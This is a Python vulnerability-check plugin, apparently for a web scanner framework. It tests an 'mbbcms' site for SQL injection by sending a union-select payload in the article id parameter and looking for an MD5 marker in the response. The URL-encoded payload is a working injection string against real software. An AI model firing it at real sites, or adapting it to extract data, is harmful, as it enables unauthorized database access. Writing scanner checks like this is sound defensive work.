#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = gxtester
#ref http://sebug.net/vuldb/ssvid-61201

def assign(service, arg):
    if service == "mbbcms":  
        return True, arg 

def audit(arg):
    payload = "?mod=article&act=detail&id=adhan%27%20union%20select%201,2,md5(%27bb2%27),4,5%20and%20%27memang%27=%27ganteng"
    url = arg + payload
    code, head, res, errcode, final_url = curl.curl('%s' % url)
  
    if code == 200:
       if '0c72305dbeb0ed430b79ec9fc5fe8505' in res: 
           security_hole(url) 

if __name__ == "__main__":
    from dummy import *
    audit(assign('mbbcms', 'http://127.0.0.1/mbbcms/')[1])
